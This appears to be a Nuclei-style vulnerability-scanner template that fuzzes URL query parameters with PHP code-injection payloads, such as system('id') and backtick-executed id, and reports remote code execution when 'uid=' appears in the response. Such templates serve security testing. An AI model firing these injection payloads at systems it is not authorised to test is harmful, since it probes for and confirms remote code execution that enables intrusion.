http:
- fuzzing:
  - fuzz:
    - '{{php_rce}}'
    mode: single
    part: query
    type: replace
  matchers:
  - part: body
    type: word
    words:
    - uid=
  method: GET
  path:
  - '{{BaseURL}}'
  payloads:
    php_rce:
    - <?php system('id'); ?>
    - <?=`id`?>
    - '''; system(''id''); //'
    - ''';`id`;//'
  stop-at-first-match: true
id: ai-fuzz-rce-php-injection
info:
  author: openai
  name: PHP RCE via Code Injection
  severity: critical
  tags: rce,dast,php
